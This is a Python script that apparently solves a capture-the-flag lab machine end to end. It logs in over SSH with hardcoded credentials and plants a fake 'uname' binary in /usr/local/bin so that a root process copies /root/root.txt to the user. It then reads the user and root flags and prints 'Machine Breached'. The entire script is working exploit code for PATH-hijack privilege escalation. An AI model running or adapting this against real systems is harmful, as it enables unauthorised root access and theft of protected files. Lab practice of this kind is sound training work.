from pickle import TRUE
import sys, os, time, signal, paramiko

def def_handler(sig, frame):
    print("\n\n[!]Going Out...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

host = "10.10.10.138"
reponse = os.system('\nping -c 1 ' + host)
if reponse == 0:
    print("\n\nConnection ON...\n")
else:
    print("\n\nConnection OFF!!!\n")

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('10.10.10.138', username='jkr', password='raykayjay9')
entrada, salida, error = ssh.exec_command("echo -e '#!/bin/bash\ncat /root/root.txt > /home/jkr/root.txt' > /usr/local/bin/uname && chmod +x /usr/local/bin/uname")
entrada, salida, error = ssh.exec_command('cat /home/jkr/user.txt')
print("User Flag: " + salida.read().decode("utf-8"))
ssh.close()

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('10.10.10.138', username='jkr', password='raykayjay9')
entrada, salida, error = ssh.exec_command('cat /home/jkr/root.txt')
print("Root Flag: " + salida.read().decode("utf-8"))
ssh.close()

print("\nMachine Breached...")


